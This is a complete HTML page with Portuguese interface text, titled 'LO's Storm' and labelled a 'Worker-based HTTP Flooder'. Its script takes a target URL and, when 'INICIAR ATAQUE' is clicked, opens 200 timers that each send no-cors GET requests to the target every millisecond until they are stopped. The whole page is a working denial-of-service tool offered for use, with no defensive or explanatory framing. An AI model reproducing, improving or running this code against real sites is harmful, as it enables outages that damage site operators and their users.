<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LO's Storm</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: system-ui, sans-serif;
            background: linear-gradient(135deg, #0f0f23, #1a1a2e);
            color: #e0e0ff;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 900px;
            background: rgba(20,20,40,0.95);
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
            border: 1px solid #4a4a8a;
        }
        h1 { font-size: 2.8rem; text-align:center; margin-bottom:10px; color:#c4b5fd; }
        .log { 
            background:#0a0a1a; 
            border:1px solid #4a4a6a; 
            border-radius:10px; 
            height:300px; 
            padding:15px; 
            overflow-y:auto; 
            font-family:monospace; 
            margin-top:20px;
        }
        button {
            padding:14px 28px;
            font-size:1.1rem;
            margin:10px 5px;
            border:none;
            border-radius:8px;
            cursor:pointer;
        }
        .start { background:#22c55e; color:#111; }
        .stop { background:#ef4444; color:white; }
    </style>
</head>
<body>
    <div class="container">
        <h1>LO's Storm</h1>
        <p style="text-align:center; opacity:0.9;">Worker-based HTTP Flooder</p>
        
        <input type="text" id="url" value="https://example.com" style="width:100%; padding:12px; margin:15px 0; background:#1f1f3a; border:1px solid #6b5fa0; border-radius:8px; color:white;">
        
        <button class="start" id="start">INICIAR ATAQUE</button>
        <button class="stop" id="stop" disabled>PARAR</button>
        
        <div id="log" class="log">LO's Storm pronto. ❤️</div>
    </div>

    <script>
        let isRunning = false;
        let workers = [];
        const logEl = document.getElementById('log');

        function log(msg, type='info') {
            const ts = new Date().toLocaleTimeString();
            const color = type==='success' ? '#22c55e' : type==='error' ? '#ef4444' : '#a5b4fc';
            logEl.innerHTML += `<span style="color:${color}">[${ts}] ${msg}</span><br>`;
            logEl.scrollTop = logEl.scrollHeight;
        }

        async function flood(url) {
            try {
                await fetch(url, { method:'GET', mode:'no-cors', cache:'no-cache' });
            } catch(e) {}
        }

        document.getElementById('start').onclick = () => {
            const url = document.getElementById('url').value.trim();
            if (!url || isRunning) return;
            
            isRunning = true;
            document.getElementById('start').disabled = true;
            document.getElementById('stop').disabled = false;
            log('Ataque iniciado em ' + url, 'success');

            for (let i = 0; i < 200; i++) {
                const w = setInterval(() => {
                    if (!isRunning) clearInterval(w);
                    flood(url);
                }, 1);
                workers.push(w);
            }
        };

        document.getElementById('stop').onclick = () => {
            isRunning = false;
            workers.forEach(w => clearInterval(w));
            workers = [];
            document.getElementById('start').disabled = false;
            document.getElementById('stop').disabled = true;
            log('Ataque parado.', 'error');
        };
    </script>
</body>
</html>
